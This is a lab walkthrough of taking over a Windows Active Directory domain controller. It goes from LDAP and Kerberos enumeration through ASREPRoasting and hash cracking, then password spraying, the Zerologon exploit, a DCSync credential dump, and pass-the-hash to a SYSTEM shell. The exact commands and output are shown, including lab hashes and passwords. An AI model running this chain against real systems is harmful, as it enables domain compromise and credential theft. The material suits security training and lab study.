# ASREProast to Zerologon Writeup


### There are numerous methods to obtain Domain Admin privileges in this lab. In this write-up, I'll demonstrate one of them. I highly recommend exploring the entire lab to discover your own path towards achieving Domain Admin status.

I use crackmapexec to gather information about the victim machine
``` bash
❯ crackmapexec smb 192.168.0.105
SMB         192.168.0.105   445    DC-KVZLX         [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:DC-KVZLX) (domain:kvzlx.local) (signing:True) (SMBv1:True)
```

Now I'll attempt to list the shared resources via SMB
``` bash
❯ smbmap -H 192.168.0.105 -u 'null'
[+] IP: 192.168.0.105:445	Name: kvzlx.local         	Status: Guest session   	
[!] Something weird happened: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied  on line 967
```
Access is denied, so I need a valid credentials to list shared resources

Try using ldapsearch to enumerate...
``` bash
❯ ldapsearch -x -H ldap://192.168.0.105 -b "DC=kvzlx,DC=local"
...........
userPrincipalName: Josephine.Kaylil@kvzlx.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=kvzlx,DC=local
dSCorePropagationData: 20231018052543.0Z
dSCorePropagationData: 20231018052536.0Z
dSCorePropagationData: 16010101000001.0Z
.............
```

With ldapsearch we can extract users
``` bash
❯ ldapsearch -x -H ldap://192.168.0.105 -b "DC=kvzlx,DC=local" | grep "userPrincipalName" | awk 'NF{print $NF}' | awk -F '@' '{print $1}' > users
```

Now with kerbrute we can validate users
``` bash
❯ kerbrute userenum --dc 192.168.0.105 -d kvzlx.local users
```

 Kerbrute detected Aimil.Alla user has no pre auth requiered, which implies ASREPRoasting was possible and we can crack the hash
``` bash
❯ kerbrute userenum --dc 192.168.0.105 -d kvzlx.local users
>  [+] Aimil.Alla has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$Aimil.Alla@KVZLX.LOCAL:00534b650fa44aecfdb1bd86880f9776$f4f035ba46e7363064d52b9e1e3c13730d330645fbfd64dc60ba10d2707d4c097e48399ea0d3a327c88555577f441098351ee47a02877c2c99fb41334d2b15404b3233a514338fe1d8b12c7dff4f079ab98629781b7ac8ceabdb9c172e07564e771be14813cd2427eba3075b0821935ee23383280ccd8b12802e80045de9a5ce4c9604914d05adf4a3f3a4fc5cfb9d9645d35710c0020774749a40147c79befe55fad23ec8e05f3e6274ed1adcc3eab7a363321aa4ca3dc85088a5c92572ac4ad0530bb2ed44ea425250dab3bffee108f48a864bb2be9ac2d14ce41e833ae1bef570122b502c2c85e517be4ad3cc03523b58014fdbff8cd7e77375749c8f

```

Use john or hashcat to crack the has
``` bash
❯ hashcat hash ~/Documents/wordlist/rockyou.txt  --> Did'nt succeed
❯ john --wordlist=PasswordList.txt hash --> Did'nt succeed
```

We can try using the GetNPUsers tool to try an ASREPRoast attack, maybe another user is vulnerable

``` bash
❯ GetNPUsers.py kvzlx.local/ -no-pass -usersfile users

$krb5asrep$23$Aimil.Alla@KVZLX.LOCAL:b7c96180d77ffb14a35d9b4fd03fd866$a701ef00bb9f7b559c03ddda4e0c1f8ac40bd002bf5cde6b21aad0470bc93bdf9bd431c08921bfb3b8dadda1ef1024f95c1d74cda13d923bc1f71c3998f482ac5eb7e4e7849608ba775d27da9549654277552b7300399b0a3752e2b1b87953a656e985b69c3c3108f38ea76f2af424eecea22bccc9c149aa5b298641c9c12f862ab623fb55a50aace3444abebe3d5eaf63b5447abd6650c30f9d5f08aa1822d182155bb25cc2a8f3b4a69db9686f29aef9df84bdce11d2f18546e67e7f622f6f42a7a5e54a1b3b3f54720a3b2a42dde2697778db8118ed3001346a93772aa2f3922a1cbcff71c43054a1

$krb5asrep$23$Shari.Lynda@KVZLX.LOCAL:c340c189e269f8252268d5b27dee88e6$d8514caf3c20438a26881e097e3af2dbd2ed8dc5e6134769612d63c3d40f60aefa18e3e27741e96e8a75f5d7d634b6109ad23fddc7a3a28f52e6c7a6af28f27ad8978af28dc7f9bf19c65d98366e23cba3ff1f42dd45c13ee35ae42acdce54cb6ed5223f62b728cdb5fb479dd633342d66e930d216cf49c4b113a0226206b228296cdcd0caa6d83fd9ff0dc96a993953af064c5eb26c3d58fd84a2f84e2a4de20dd754da9c7748eaa497396e55fd6a66c6fd913af7d7d62b6dd09d3aebe63ac4203f833c800a0d9d6fff199980312d53ce95611944b9f5b186fc8611f6f499fc796a9789e7a131526ac7

$krb5asrep$23$Maryjane.Maribelle@KVZLX.LOCAL:51034711191982420c393219ba907fbb$fc126119f769a6a03aed49b9cf0a45b327c8c88aba047617a158645182df6559288caa0849c453a059daac65a26ecd2a36d75ced4660ce8df37dec85e6d3c0ca4188e34d9765fa6f4888194185252a5629e1c00dba6db1ec60145bacd503b226060609b3b34d8d9f9b0fafcad02bfb6aeaa0e7447613ce109bbcc45b1a74ebfa57e9cc9ede94e004aaf74678e7b51ba61f46d60f7422a90ef1f85b41bc6579079b36181a4238296194bf7c026ead252fea663c43e441bb8965ec73737e6d6d091cf320104ce16c9b14c3bcdc826262f6d66b0e0067aa0e3e84c8a99a1126bdb2200902c41057d723a05e
```

We got 3 hashes, One is the same user as before when using kerbrute but the hash is different
``` bash
#This time I could crack the Aimil.Alla hash, sound like i'ts better use impacket tools that kerbrute for this.
❯ hashcat hash ~/Documents/wordlist/rockyou.txt  --> Aimil.Alla:pakistan
❯ hashcat hash ~/Documents/wordlist/rockyou.txt  --> Maryjane.Maribelle:1234qwer
❯ hashcat hash ~/Documents/wordlist/rockyou.txt  --> Shari.Lynda:barney
```

We validate these credentials using crackmapexec 

``` bash
❯ crackmapexec smb 192.168.0.105 -u user -p passwd --no-bruteforce --continue-on-success

SMB         192.168.0.105   445    DC-KVZLX         [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:DC-KVZLX) (domain:kvzlx.local) (signing:True) (SMBv1:True)
SMB         192.168.0.105   445    DC-KVZLX         [+] kvzlx.local\Aimil.Alla:pakistan 
SMB         192.168.0.105   445    DC-KVZLX         [+] kvzlx.local\Maryjane.Maribelle:1234qwer 
SMB         192.168.0.105   445    DC-KVZLX         [+] kvzlx.local\Shari.Lynda:barney 

```

These credentials are correct but we're unable to access the system using them, so we need to enumerate further, lets start with rpcclient

``` bash
❯ rpcclient -U "Aimil.Alla%pakistan" 192.168.0.105
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsAdmins] rid:[0x44d]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Office Admin] rid:[0x6df]
group:[IT Admins] rid:[0x6e0]
group:[Executives] rid:[0x6e1]
group:[Senior management] rid:[0x6e2]
group:[Project management] rid:[0x6e3]
group:[IT Helpdesk] rid:[0x6e4]
group:[Marketing] rid:[0x6e5]
group:[Sales] rid:[0x6e6]
group:[Accounting] rid:[0x6e7]

```

We can manually enumerate it, but that can be time-consuming. So, we use rpcenum tool, I fork this tool in my repository and edit it for my use, You can also use my modified version if you'd like. https://github.com/kvlx-alt/rpcenumV2

```
❯ ./rpcenum.sh -e All -i 192.168.0.105 -u Aimil.Alla -p pakistan
[*] Listing domain users with description...

  +                    +                                                           +
  | User               | Description                                               |
  +                    +                                                           +
  | Administrator      | Built-in account for administering the computer/domain    |
  | Guest              | Built-in account for guest access to the computer/domain  |
  | krbtgt             | Key Distribution Center Service Account                   |
  | DefaultAccount     | A user account managed by the system.                     |
  | hedda.aaren        | Company default password(Reset ASAP)                      |
  | maryrose.rochette  | New user generated password: A/t[2K6                      |
  | nellie.hermina     | New user generated password: ?|kM9No                      |
  | minerva.corabelle  | New user generated password: {|$%qN0                      |
  | florella.alvinia   | New user generated password: zDz:aF}                      |
  | ardine.gaynor      | Company default password(Reset ASAP)                      |
  | loella.adriane     | Company default password(Reset ASAP)                      |
  | maurizia.melly     | DNS Admin                                                 |
  +                    +                                                           +
```

Now we have more credentials,  and some interesting information (We will enumerate this information using ldapdomaindump later)
```
ardine.gaynor      | Company default password(Reset ASAP)  
loella.adriane     | Company default password(Reset ASAP)  
hedda.aaren        | Company default password(Reset ASAP) 
maurizia.melly     | DNS Admin 


```

use crackmapexec to validate the credentials first
```
maryrose.rochette:A/t[2K6
nellie.hermina:?|kM9No
minerva.corabelle:{|$%qN0
florella.alvinia:zDz:aF}

--------------------
❯ crackmapexec smb 192.168.0.105 -u user -p passwd --no-bruteforce --continue-on-success


SMB         192.168.0.105   445    DC-KVZLX         [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:DC-KVZLX) (domain:kvzlx.local) (signing:True) (SMBv1:True)
SMB         192.168.0.105   445    DC-KVZLX         [+] kvzlx.local\Aimil.Alla:pakistan 
SMB         192.168.0.105   445    DC-KVZLX         [+] kvzlx.local\Maryjane.Maribelle:1234qwer 
SMB         192.168.0.105   445    DC-KVZLX         [+] kvzlx.local\Shari.Lynda:barney 
SMB         192.168.0.105   445    DC-KVZLX         [-] kvzlx.local\maryrose.rochette:A/t[2K6 STATUS_PASSWORD_MUST_CHANGE 
SMB         192.168.0.105   445    DC-KVZLX         [-] kvzlx.local\nellie.hermina:?|kM9No STATUS_PASSWORD_MUST_CHANGE 
SMB         192.168.0.105   445    DC-KVZLX         [-] kvzlx.local\minerva.corabelle:{|$%qN0 STATUS_PASSWORD_MUST_CHANGE 
SMB         192.168.0.105   445    DC-KVZLX         [+] kvzlx.local\florella.alvinia:zDz:zDz:aF} 

```

3 users has STATUS_PASSWORD_MUST_CHANGE, so we can try to change it

``` bash
❯ smbpasswd -r 192.168.0.105 -U "maryrose.rochette"
machine 192.168.0.105 rejected the password change: Error was : The transport connection is now disconnected..
```

We couldn't change the password.
We have a user list, let's try a password spraying with the passwords that we already have.

``` bash
❯ crackmapexec smb 192.168.0.105 -u users -p passwd  --continue-on-success 
```

We got nothing, so we try now smbmap 
``` bash
❯ smbmap -H 192.168.0.105 -u 'Aimil.Alla' -p 'pakistan'

[+] IP: 192.168.0.105:445	Name: kvzlx.local         	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	Common                                            	READ, WRITE	
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
```

We have read,write permissions in Common share drive, and we look NETLOGON maybe a zerologon exploit works here, lets try it- https://github.com/dirkjanm/CVE-2020-1472/tree/master
"*This exploit scenario changes the NT hash of the domain controller computer account in Active Directory, but not in the local SAM database, hence creating some issues in Active Directory domains. In order to prevent disruption as much as possible, attackers can try to exploit the CVE, find the NT hash of the Domain Controller account before it was changed, and set it back in Active Directory.*" https://www.thehacker.recipes/a-d/movement/netlogon/zerologon

```
❯ python zerologon.py DC-KVZLX 192.168.0.105
Performing authentication attempts...
==============================================================================================================================================================================================================================================
Target vulnerable, changing account password to empty string

Result: 0

Exploit complete!
```

Now we can perform a DCSync attack
```

❯ secretsdump.py -just-dc -no-pass 'DC-KVZLX$'@192.168.0.105
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2e2a0ed9b609c1e3b17e122a36cbce96:::
```

This way, we obtain all local administrator accounts and other domain accounts, and with this hashes, we can perform pass-the-hash attacks using the "psexec" tool.

But before. Obtain the machine account hex encoded password with the domain admin credentials
```bash
❯ secretsdump.py -hashes :2e2a0ed9b609c1e3b17e122a36cbce96 kvzlx/administrator@192.168.0.105
```

Now restore the machine account password https://github.com/dirkjanm/CVE-2020-1472/blob/master/restorepassword.py
```bash
❯ python restorepassword.py kvzlx.local/dc-kvzlx@dc-kvzlx -target-ip 192.168.0.105 -hexpass 62006d0069004b0072005400230035002200500022005d006c0033003d0030004b004e0021002b003d006b0059005e00580021002600560048004a00590079002f007000490071002c00270037002a005a003f0052005c00580030005700340039003a004e003d0054005400290050003b0031006b0041006e0077004b00650021002300460033004200610066002b0076004b0060005200230038004c005900740051007100280021004e00740028005000450060003c0040006c0064005e0076004c0068003d004c00590029003f005f003e003a00580038002d004a00660031003100270034003500670025006700
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] StringBinding ncacn_ip_tcp:192.168.0.105[49671]
Change password OK
```

Now we can gain access as administrator in the victim machine.
```bash
❯ psexec.py kvzlx/Administrator@192.168.0.105 -hashes :2e2a0ed9b609c1e3b17e122a36cbce96
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 192.168.0.105.....
[*] Found writable share ADMIN$
[*] Uploading file MEyFvNkb.exe
[*] Opening SVCManager on 192.168.0.105.....
[*] Creating service wFuw on 192.168.0.105.....
[*] Starting service wFuw.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

```
